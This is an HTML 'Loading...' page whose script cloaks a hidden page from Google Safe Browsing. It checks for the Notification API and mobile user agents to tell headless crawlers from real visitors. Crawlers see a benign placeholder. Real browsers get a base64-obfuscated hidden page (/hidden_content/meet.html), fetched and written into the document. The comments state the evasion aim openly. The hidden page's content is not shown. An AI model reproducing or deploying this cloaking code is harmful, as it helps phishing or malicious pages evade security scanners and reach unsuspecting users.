<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        // Base64 encoded path to the hidden content
        // /hidden_content/meet.html -> L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==
        const realContent = 'L2hpZGRlbl9jb250ZW50L21lZXQuaHRtbA==';

        // GSB Crawler Detection: Headless Chrome doesn't have Notification API
        // Check for Notification API OR mobile device (mobile may not have Notification API)
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const hasNotificationAPI = self.Notification;

        // Load content if browser has Notification API (real browser) OR is mobile device
        // GSB crawler (headless Chrome) will be blocked - no Notification API, not mobile
        if (hasNotificationAPI || isMobile) {
            fetch(atob(realContent))
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to load content');
                    }
                    return response.text();
                })
                .then(html => {
                    document.open();
                    document.write(html);
                    document.close();
                })
                .catch(err => {
                    console.error('Error loading content:', err);
                    document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
                });
        } else {
            // GSB Crawler / Bot (headless Chrome) - Show benign content
            document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
        }
    </script>
</head>

<body>
    <!-- Fallback content if JS is disabled -->
</body>

</html>
